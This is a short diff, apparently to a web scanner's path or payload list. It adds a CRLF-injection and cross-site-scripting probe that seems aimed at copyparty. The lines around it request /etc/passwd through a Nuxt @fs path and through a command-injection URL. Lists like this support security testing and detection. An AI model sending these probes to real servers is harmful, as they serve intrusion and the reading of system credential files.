@@ -1,3 +1,4 @@
+/?k304=y%0D%0A%0D%0A<img+src%3Dcopyparty+onerror%3Dalert(1)>
 /_nuxt/@fs
 /_nuxt/@fs/etc/passwd
 /pages/systemcall.php\?command\=cat%20/etc/passwd
